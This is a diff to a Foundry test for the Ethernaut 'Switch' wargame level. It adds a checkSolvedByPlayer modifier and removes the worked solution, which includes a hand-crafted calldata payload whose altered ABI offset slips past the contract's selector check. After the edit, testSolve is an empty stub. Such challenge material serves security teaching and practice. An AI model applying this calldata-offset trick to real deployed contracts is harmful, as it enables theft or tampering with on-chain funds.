@@ -20,6 +20,12 @@ contract TestSwitch is Test, Utils {
                                  HELPERS
     //////////////////////////////////////////////////////////////*/
 
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    }
+
     function setUp() public {
         address payable[] memory users = createUsers(2);
 
@@ -51,25 +57,6 @@ contract TestSwitch is Test, Utils {
     }
 
     /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player);
-
-        bytes memory data = abi.encodeWithSelector(
-            bytes4(keccak256("flipSwitch(bytes)")), abi.encodeWithSelector(bytes4(keccak256("turnSwitchOff()")))
-        );
-        (bool success, bytes memory err) = address(instance).call(data);
-        if (!success) {
-            console.logBytes(err);
-        }
-        assertTrue(!instance.switchOn());
-
-        data =
-            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff20606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
-        (success, err) = address(instance).call(data);
-        if (!success) {
-            console.logBytes(err);
-        }
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    function testSolve() public checkSolvedByPlayer{
     }
 }
